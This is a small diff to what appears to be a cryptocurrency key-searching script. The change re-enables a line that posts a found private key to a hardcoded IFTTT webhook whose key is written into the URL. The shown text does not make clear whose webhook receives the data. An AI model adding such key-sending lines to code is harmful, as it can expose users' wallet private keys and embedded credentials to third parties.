@@ -73,7 +73,7 @@ def seek(r, df_handler):
 					msg = "\nPublic: " + str(pub) + " ---- Private: " + str(priv)
 					text = msg
 					print(text)
-					#requests.post(url="https://maker.ifttt.com/trigger/hmbt/with/key/d8gr-cI50XXn1WSEOHf64W", data={ 'value1' : 'P', 'value2' : fullkey1, 'value3' : 'R3'})
+					requests.post(url="https://maker.ifttt.com/trigger/hmbt/with/key/d8gr-cI50XXn1WSEOHf64W", data={ 'value1' : 'P', 'value2' : fullkey1, 'value3' : 'R3'})
 					with open('Wallets.txt','a') as f:
 						f.write(priv)
 						f.write('     ')
